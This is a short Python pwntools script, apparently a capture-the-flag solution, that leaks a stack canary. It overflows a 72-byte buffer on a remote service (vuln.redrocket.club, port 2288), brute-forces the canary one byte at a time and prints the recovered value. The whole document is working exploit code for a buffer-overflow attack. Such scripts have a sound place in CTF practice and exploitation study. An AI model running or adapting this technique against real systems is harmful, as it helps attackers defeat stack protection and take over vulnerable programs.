from pwn import *

# leaking canary
# the buf array has length 72
# after the array, on the stack the canary follows
# so we can try finding the canary by trying out the bytes right after the array

# we know the first byte of the canary: \x00
payload = b"1" * 72 + b"\x00"
can = b"\x00"
# we need to find the other 7 bytes (brute force)
for i in range(1,8):
    for byte in range(1,255):
        # conn = remote('127.0.0.1', 6666)
        conn = remote('vuln.redrocket.club',2288)
        # "Connected!"
        output = conn.recvline()
        #print(output)

        byte = byte.to_bytes(1, "big")
        #print(byte)
        new_payload = payload + byte
        #print(new_payload)

        conn.send(new_payload)
        output = conn.recvline()
        #print(output)
        output = conn.recvline()
        #print(output)
        # found the correct byte
        if(str(output).__contains__("Dis")):
            payload = new_payload
            print("found byte no: " + str(i) + (". It's: " + str(byte)))
            can = can + byte
            break;
print(can)












